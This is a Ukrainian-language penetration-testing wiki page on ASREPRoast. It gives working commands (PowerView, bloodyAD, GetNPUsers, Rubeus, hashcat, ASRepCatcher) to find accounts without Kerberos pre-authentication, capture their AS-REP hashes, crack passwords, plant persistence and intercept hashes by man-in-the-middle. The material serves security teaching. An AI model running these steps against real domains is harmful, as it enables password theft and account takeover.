# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast - це атака на безпеку, яка експлуатує користувачів, які не мають **атрибута, що вимагає попередньої аутентифікації Kerberos**. По суті, ця вразливість дозволяє зловмисникам запитувати аутентифікацію для користувача у Контролера домену (DC) без необхідності знати пароль користувача. DC потім відповідає повідомленням, зашифрованим за допомогою ключа, отриманого з пароля користувача, який зловмисники можуть спробувати зламати офлайн, щоб дізнатися пароль користувача.

Основні вимоги для цієї атаки:

- **Відсутність попередньої аутентифікації Kerberos**: Цільові користувачі не повинні мати цю функцію безпеки увімкненою.
- **З'єднання з Контролером домену (DC)**: Зловмисники повинні мати доступ до DC, щоб надсилати запити та отримувати зашифровані повідомлення.
- **Необов'язковий обліковий запис домену**: Наявність облікового запису домену дозволяє зловмисникам більш ефективно ідентифікувати вразливих користувачів через LDAP-запити. Без такого облікового запису зловмисники повинні вгадувати імена користувачів.

#### Перерахування вразливих користувачів (потрібні облікові дані домену)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Запит повідомлення AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting з Rubeus створить 4768 з типом шифрування 0x17 та типом попередньої автентифікації 0.

### Злом
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Постійність

Примусьте **preauth**, який не потрібен для користувача, де у вас є **GenericAll** дозволи (або дозволи на запис властивостей):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast без облікових даних

Зловмисник може використовувати позицію "людина посередині", щоб захопити пакети AS-REP під час їх проходження через мережу, не покладаючись на відключення попередньої автентифікації Kerberos. Тому це працює для всіх користувачів у VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) дозволяє нам це зробити. Більше того, інструмент змушує робочі станції клієнтів використовувати RC4, змінюючи переговори Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Посилання

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
